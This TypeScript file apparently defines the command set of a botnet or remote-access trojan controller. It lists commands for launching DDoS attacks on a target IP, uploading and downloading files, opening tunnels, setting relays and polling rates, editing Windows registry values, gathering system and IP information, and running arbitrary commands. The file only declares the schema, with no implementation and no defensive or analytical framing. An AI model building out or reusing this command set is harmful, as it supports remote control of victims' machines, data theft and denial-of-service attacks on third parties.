
export interface Command {
    "name": string,
    "args": Record<string, string | boolean | number> | null,
}


export interface AvailableCommands {
    "commands": Command[]
}

export const availableCommands: AvailableCommands = {
    "commands": [
        {
            "name": "set-relay",
            "args": {
                "ip": "string"
            }
        },
        {
            "name": "set-pulling-rate",
            "args": {
                "seconds": "number"
            }
        },
        {
            "name": "open-tunnel",
            "args": {

            }
        },
        {
            "name": "get-sys-info",
            "args": {

            }
        },
        {
            "name": "ping",
            "args": {}
        },
        {
            "name": "ddos",
            "args": {
                "targetIp": "string",
                "duration": "number"
            }
        },
        {
            "name": "download-file",
            "args": {
                "url": "string",
                "path": "string"
            }
        },
        {
            "name": "upload-file",
            "args": {
                "path": "string"
            }
        },
        {
            "name": "get-public-ip",
            "args": {

            }
        },
        {
            "name": "get-private-ip",
            "args": {
                "network": "string"
            }
        },
        {
            "name": "create-reg-value",
            "args": {
                "path": "string",
                "targetKey": "string",
                "value": "string"
            }
        },
        {
            "name": "edit-reg-value",
            "args": {
                "path": "string",
                "targetKey": "string",
                "value": "string"
            }
        },
        {
            "name": "delete-reg-value",
            "args": {
                "path": "string",
                "targetKey": "string"
            }
        },
        {
            "name": "run-command",
            "args": {
                "command": "string"
            }
        }
    ]
}